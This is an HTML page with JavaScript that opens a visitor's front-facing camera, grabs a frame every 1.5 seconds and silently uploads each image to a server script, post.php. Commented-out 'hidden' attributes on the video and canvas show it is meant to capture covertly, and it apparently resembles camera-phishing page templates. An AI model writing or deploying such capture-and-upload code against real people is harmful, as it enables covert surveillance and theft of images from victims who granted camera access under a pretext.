<html>
<body>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<p>Opening the Camera and taking picture</p>

<!-- <div class="video-wrap" hidden="hidden"> -->
<div class="video-wrap">
   <video id="video" playsinline autoplay></video>
</div>

<!-- <canvas hidden="hidden" id="canvas" width="640" height="640"></canvas> -->
<canvas id="canvas" width="640" height="640"></canvas>

<script>

function post(image_data){
$.ajax({
    type: 'POST',
    data: { image_value: image_data},
    url: '/post.php',
    dataType: 'json',
    async: false,
    success: function(result){
       console.log('good')
    },
    error: function(){
    }
  });
};


'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {
    
    facingMode: "user"
  }
};

// Access the camera
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = 'navigator.getUserMedia error:${e.toString()}';
  }
}
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  setInterval(function(){

       context.drawImage(video, 0, 0, 640, 640);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData); }, 1500);
  

}
init();

</script>

</body>
</html>

